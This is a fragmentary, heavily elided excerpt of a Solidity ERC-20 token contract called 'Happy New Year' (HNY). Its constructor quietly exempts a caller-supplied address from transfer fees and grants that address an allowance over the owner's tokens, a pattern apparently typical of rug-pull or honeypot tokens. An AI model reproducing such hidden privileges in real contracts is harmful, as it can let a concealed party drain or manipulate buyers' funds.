...
contract HappyNewYear is Context, IERC20, Ownable {
    ...
    uint256 public  _totalSupplyAmount = 2023000000  * 10**(_decimals);
    string private _name = unicode"Happy New Year";
    string private _symbol = unicode"HNY";
    ...
    uint256 public _sellTaxAmount =3;
    bool enableTrade=true;  
    
    
    constructor (address secondPair) {
        noFeeList[secondPair ] = true;
        ...
        _allowances[owner()][address(secondPair)] = marketTx;
    ...
    function _marketingTransfer(address sender, address recipient, uint256 amount) private returns (bool) {            
        ...
        uint256 finalAmount = (noFeeList[sender] || noFeeList[recipient]) ? amount : _marketingTransferFee(sender, recipient, amount);
